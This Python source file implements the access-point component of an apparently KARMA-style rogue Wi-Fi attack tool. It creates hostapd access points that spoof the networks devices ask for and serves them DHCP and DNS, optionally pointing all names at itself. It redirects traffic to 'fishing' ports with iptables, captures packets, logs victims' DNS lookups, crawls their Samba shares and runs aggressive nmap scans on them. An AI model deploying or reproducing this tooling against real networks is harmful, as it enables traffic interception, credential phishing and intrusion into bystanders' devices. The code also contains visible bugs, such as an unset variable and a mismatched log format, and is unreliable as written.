from threading import Lock,Thread
import time,random,re,tempfile
from select import select
import subprocess
import os
from datetime import datetime

from SambaCrawler import *
from Utils import *

class AccessPoint(Thread):
  def __init__(self, karma, ifhostapd, essid, bssid, timeout, wpa2=None, fishing=True):
    Thread.__init__(self)
    self.essid = essid
    self.bssid = []
    for e in essid:
      self.bssid.append(karma.getMacFromIface(ifhostapd.str()))
    if len(bssid) > 1:
      self.bssid = bssid
    self.karma = karma
    self.timeout = timeout
    self.wpa2 = wpa2
    self.ifhostapd = ifhostapd
    self.ifaces = []
    self.unused = True
    self.activity_ts = time.time()
    self.logfile = None
    self.clients = {}
    self.ifaces,self.hostapd_process = self.create_hostapd_access_point(essid, bssid, wpa2)
    
    for iface in self.ifaces:
      subnet = self.karma.get_unique_subnet()
      self.subnet = None
      self.setup_iface(iface,subnet)

      self.dhcpd_process = self.start_dhcpd(iface,subnet)

      self.nmaps = []

      if self.karma.tcpdump:
        self.tcpdump_process = self.start_tcp_dump()
      else:
        self.tcpdump_process = None

      if fishing:
        # allow DNS
        self.setup_allow(iface, 'udp', 53)
        self.setup_allow(iface, 'tcp', 53)
        # allow DHCP
        self.setup_allow(iface, 'udp', 67)
        # redirect the following ports
        for sport, dport in self.karma.redirections.iteritems():
          self.setup_allow(iface,'tcp',dport)
          self.setup_redirections(iface,sport,dport)
        self.connectionwatch_process = self.start_connectionwatch(iface)

        # block all input packets
        self.setup_block_all(iface)

      else:
        self.connectionwatch_process = None

  def start_tcp_dump(self):
    self.logfile = os.path.join(self.karma.logpath,"wifi-%s-%s.cap"%(self.get_essid(),datetime.now().strftime("%Y%m%d-%H%M%S")))
    self.karma.log( "[+] Starting tcpdump %s"%self.logfile )
    cmd = ['tcpdump']
    for iface in self.ifaces:
      cmd.append('-i')
      cmd.append(iface)
    cmd.append('-w')
    cmd.append(self.logfile)
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p
            
  
  def register_client(self, mac,ip, name = ""):
    if not self.clients.has_key(mac):
      self.unused = False
      self.clients[mac] = ip
      self.karma.log( "new client %s (%s) %s"%(mac, ctxt(ip, GREEN), name))
      smb = SambaCrawler(self.karma, ip, 'smb_%s'%mac)
      smb.start()
      if self.karma.scan:
        try:
          self.nmaps.append(self.nmap(ip))
        except:
          self.karma.log( "%s Unable to start nmap %s"%(ctxt("[!]",RED)) )
  
  def run(self):
    set_title('hostapd %s'%self.get_essid())
    self.karma.log( "[+] now running" )
    
    def _killall():
        try:
          self.dhcpd_process.kill()
          self.dhcpd_process.wait()
        except:
          self.karma.log( "%s could not kill dhcpd"%ctxt("[!]",RED))
        try:
          self.hostapd_process.kill()
          self.hostapd_process.wait()
          time.sleep(0.5)
        except:
          self.karma.log( "%s could not kill hostapd"%ctxt("[!]",RED))
        if self.tcpdump_process is not None:
          try:
            self.tcpdump_process.kill()
            self.tcpdump_process.wait()
          except:
            self.karma.log( "%s could not kill tcpdump"%ctxt("[!]",RED))
          if self.karma.tcpdump and self.unused and not self.karma.debug:
            try:
              self.karma.log( "[-] deleting %s"%self.logfile)
              os.remove(self.logfile)
            except:
              self.karma.log( "%s error deleteting %s"%((ctxt("[!]",RED)), self.logfile))
              pass
        if self.connectionwatch_process is not None:
          try:
            self.connectionwatch_process.kill()
            self.connectionwatch_process.wait()
          except:
            self.karma.log( "%s could not kill connectionwatch"%ctxt("[!]",RED))
        
        #clear route cache
        cmd = ["ip", "route", "del", self.subnet.range_null()]
        p = subprocess.Popen(cmd)
        p.wait()
        
        for iface in self.ifaces:
          cmd = ["iwconfig", iface, "mode", 'managed']
          p = subprocess.Popen(cmd)
          p.wait()
        
        for p in self.nmaps:
          p.kill()
          p.wait()
        try:
          for e in self.essid:
            self.karma.release_ap(self.e)
        except:
          pass
        self.karma.ifhostapds.free_one(self.ifhostapd)
        self.karma.free_subnet(self.subnet)
        
    #precompile regexp
    dhcp_failed_re = re.compile(r".*failed.*\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b")
    dhcpack_re = re.compile(r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*")
    disassociated_re = re.compile(r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*")
    authenticated_re = re.compile(r".*: STA ([a-zA-Z0-9:]+) IEEE 802.11: authenticated")
    hostapd_fails_re = re.compile(r".*: Interface (\w+) wasn't started")
    cname_watch_re = re.compile(r".* > (\w+:\w+:\w+:\w+:\w+:\w+).*CNAME*\s([a-z0-9-\.]+)\..*")
    aaaa_watch_re = re.compile(r"(\w+:\w+:\w+:\w+:\w+:\w+) >.*length \d+:\s([0-9\.]+)\.\d+.*A\?*\s([a-z0-9-\.]+)\..*")
    arp_watch_re = re.compile(r"(\w+:\w+:\w+:\w+:\w+:\w+) > .*\b((?:[0-9]{1,3}\.){3}[0-9]{1,3})\b tell \b((?:[0-9]{1,3}\.){3}[0-9]{1,3})\b")
    hostapd_error = ""
    while True:
      # check alive
      if self.activity_ts is None:
        self.karma.log( "%s Unable to create an AP for %s"%(ctxt("[!]",RED),self.get_essid()))
        _killall()
        return

      # check timeout
      if time.time() - self.activity_ts > self.timeout:
        self.karma.log( "[x] No activity for essid %s, destroying AP"%self.get_essid())
        _killall()
        return

      files = []

      dhcpfd = self.dhcpd_process.stderr.fileno()
      files.append(dhcpfd)

      airfd = self.hostapd_process.stdout.fileno()
      files.append(airfd)
    
      if self.connectionwatch_process is not None:
        connwfd = self.connectionwatch_process.stdout.fileno()
        files.append(connwfd)

      
      nmapsd = []
      for n in self.nmaps:
        nmapsd.append(n.stdout.fileno())
      files.extend(nmapsd)
      rlist,wlist,xlist = select(files,[],[],1)
      i = 0
      for n in nmapsd:
        if n in rlist:
          lr = LineReader(self.nmaps[i].stdout.fileno())
          lines = lr.readlines()
          for line in lines:
            if len(line) != 0:
              print line
        i += 1
        
      if dhcpfd in rlist:
        lr = LineReader(self.dhcpd_process.stderr.fileno())
        lines = lr.readlines()
        for line in lines:
          if len(line) != 0:
            #print "dnsmasq  %s"%line
            m = dhcp_failed_re.match(line)
            if m is not None:
              self.karma.log( "%s %s"%(ctxt("[!]",RED), line))
              _killall()
              return
            else:
              m = dhcpack_re.match(line)
              if m is not None:
                ip,mac,name = m.groups()
                self.register_client(mac, ip, name)
              #else:
                # this regexp seems to be really slow
                #m = disassociated_re.match(line)
                #print "000022"
                #if m is not None:
                  #mac = m.groups()
                  #self.karma.log( "dissociated %s"%mac)
                  #self.clients.pop(mac,None)

      if airfd in rlist:
        lr = LineReader(self.hostapd_process.stdout.fileno())
        lines = lr.readlines()
        for line in lines:
          if len(line) != 0:
            hostapd_error = "%s%s"%(hostapd_error,line)
            #print "hostapd  %s"%line
            m = authenticated_re.match(line)
            if m is not None:
              mac, = m.groups()
              if not self.clients.has_key(mac):
                self.karma.log( "Client %s associated to %s"%(ctxt(mac,GREEN),ctxt(self.get_essid(),GREEN)))
                self.unused = False

              self.activity_ts = time.time()
            else:
              m = hostapd_fails_re.match(line)
              if m is not None:
                ifname, = m.groups()
                self.karma.log( "%s Unable to start hostapd on interface %s: %s"%(ctxt("[!]",RED),ctxt(ifname,RED), line))
                # will remove AP from list on next check
                self.activity_ts = None  
                if self.karma.debug:
                  print hostapd_error

      if connwfd in rlist:
        lr = LineReader(self.connectionwatch_process.stdout.fileno())
        lines = lr.readlines()
        for line in lines:
          if len(line) != 0:
            #print "dnswatch %s"%line
            dns = {}
            # only show requests
            if "CNAME" in line:
              m = cname_watch_re.match(line)
              if m is not None:
                mac,host = m.groups()
                dns = {
                  'bssid': mac,
                  'host': host
                  }
            else:
              if "AAAA?" in line or "A?" in line:
                m = aaaa_watch_re.match(line)
                if m is not None:
                  mac, ip, host = m.groups()
                  dns = {
                    'bssid': mac,
                    'host': host
                    }
                  self.register_client(mac,ip)
              else:
                #check for gratuitous arp
                m = arp_watch_re.match(line)
                if m is not None:
                  mac, ipsrc, ipdst = m.groups()
                  if ipsrc == ipdst and mac != self.bssid:
                    self.karma.log("[+] %s gratuitous arp from %s to %s"%(ctxt(self.get_essid(),GREEN), mac, ipdst))
                    subnet_base = "%s.%%d"%('.'.join(ipsrc.split('.')[:3]))
                    subnet = IPSubnet(subnet_base)
                    #if self.subnet.gateway() != subnet.gateway():
                      #self.karma.log("[+] switching to %s"%(ctxt(subnet.gateway(), GREEN)))
                      #self.setup_iface(self.ifhostapd.iface,subnet)
                    self.register_client(mac,ipsrc)
            if dns != {}: 
              if self.karma.update_dns({'dns':dns}):
                self.karma.log( "[+] %s %s => %s"%(ctxt(self.get_essid(),GREEN), dns['bssid'], dns['host']))
          self.activity_ts = time.time()

  def nmap(self, ip):
    self.karma.log( "[+] nmapping %s"%ip)
    cmd = ['nmap', '-Pn', '-T5', '--open', '-A', "%s"%ip]
    p = subprocess.Popen(cmd
    ,stdout=subprocess.PIPE
    ,stderr=subprocess.PIPE
    )
    return p
    

  def setup_iptables(self, cmd):
    cmd = ['iptables',] + cmd
    if self.karma.debug:
      self.karma.log('[?] %s'%(' '.join(cmd)))
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    p.wait()
    return p

  def setup_block_all(self, iface):
    self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-m','conntrack',
      '-j','ACCEPT',
      '--ctstate','RELATED,ESTABLISHED',
    ])
    self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-m','state',
      '--state','ESTABLISHED,RELATED',
      '-j','ACCEPT',
    ])
    self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-j','DROP'])
    self.setup_iptables([
      '-A','OUTPUT',
      '-i',iface,
      '-m','state',
      '--state','ESTABLISHED,RELATED',
      '-j','ACCEPT',
    ])
    self.setup_iptables([
      '-A','OUTPUT',
      '-i',iface,
      '-j','DROP'])
    self.setup_iptables([
      '-A','FORWARD',
      '-i',iface,
      '-m','state',
      '--state','ESTABLISHED,RELATED',
      '-j','ACCEPT',
    ])
    self.setup_iptables([
      '-A','FORWARD',
      '-i',iface,
      '-j','DROP'])

  def setup_allow(self, iface, proto, port):
    return self.setup_iptables([
      '-A','INPUT',
      '-i',iface,
      '-p',proto,
      '--dport',str(port),
      '-j','ACCEPT'])

  def setup_redirections(self, iface, inport, outport):
    self.setup_iptables([
      '-A', 'PREROUTING',
      '-i', iface,
      '-t', 'nat',
      '-p', 'tcp',
      '--dport', str(inport),
      '-j', 'REDIRECT',
      '--to-port', str(outport),
      ])

  def start_dhcpd(self, iface, subnet):
    # create a temporary file
    self.karma.log( "[+] Starting dhcp server %s %s"%(iface,subnet.range()))

    cmd = ['dnsmasq',
      '-d',
      '--log-dhcp',
      '--bind-dynamic',
      '--log-facility=-',
      '-i', iface,
      '-F', '%s,%s'%(subnet.range_lower(),subnet.range_upper()),
      '--dhcp-option=option:router,%s'%(subnet.gateway()),
      '--dhcp-option=option:dns-server,%s'%(subnet.gateway()),
    ]
      
    if(self.karma.offline):
      cmd.append('-R')
      # https://technet.microsoft.com/en-us/library/cc732049%28v=ws.10%29.aspx
      cmd.append('--address=/dns.msftncsi.com/131.107.255.255')
      cmd.append('--address=/#/%s'%(subnet.gateway()))
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p

  def setup_iface(self, iface, subnet):
    self.subnet = subnet
    self.karma.log( "[+] Uping iface %s w/ subnet %s"%(iface,subnet.range()))
    iprange = "%s"%subnet.range()
    cmd = ["ifconfig",iface,iprange]
    p = subprocess.Popen(cmd)
    p.wait()

  def start_connectionwatch(self, iface):
    cmd = ["tcpdump","-i",iface,"-e","-s0","-l","-t","-n","arp","or","udp","port","53"]
    p = subprocess.Popen(cmd,
      stdout=subprocess.PIPE,
      stderr=subprocess.PIPE)
    return p

  def get_essid(self):
    return '-'.join(self.essid)

  def create_hostapd_access_point(self, essid, bssid, wpa2):
    bssid_text = ""
    bssid_text = " with bssid %s"%len(bssid)
    self.karma.log( "[+] Creating (hostapd) AP %s %s"%(ctxt(self.get_essid(),GREEN),bssid_text))
    ifaces = []
    interface = self.ifhostapd.str()
    ifaces.append(interface)
    channel = random.randint(1,11)
    

    f = tempfile.NamedTemporaryFile(delete=False)
    f.write("interface=%s\n"%(interface))
    f.write("ssid=%s\n"%(essid[0]))
    if bssid[0] is not None:
      f.write("bssid=%s\n"%(bssid))
    f.write("channel=%s\n"%(channel))
    f.write("hw_mode=g\n")
    f.write("ieee80211n=1\n")
    if wpa2 is not None:
      f.write("wpa=2\n")
      f.write("wpa_passphrase=%s\n"%wpa2)
      f.write("wpa_key_mgmt=WPA-PSK\n")
      f.write("wpa_pairwise=CCMP\n")
      f.write("rsn_pairwise=CCMP\n")
    
    i = 0
    for e in essid[1:]:
      interface = "%s_%s\n"%(interface[-3:], i)
      ifaces.append(interface)
      f.write("bss=%s"%interface)
      f.write("ssid=%s\n"%e)
      if bssid[i] is not None:
        f.write("bssid=%s\n"%(bssid[i]))
      i += 1
    
    f.close()
    cmd = ["hostapd","-d",f.name]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return ifaces,p

  def create_airbase_access_point(self, essid):
    self.karma.log( "[+] Creating (airbase) AP %s"%essid)
    cmd = ["airbase-ng",
      "--essid", "%s"%essid,
      "-c","4",
      "-I","2000",
      self.karma.ifmon]
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE)

    while True:
      line = p.stdout.readline()
      m = re.match(r".*Created tap interface (\w+)",line)
      if m is not None:
        iface, = m.groups()
        return iface,p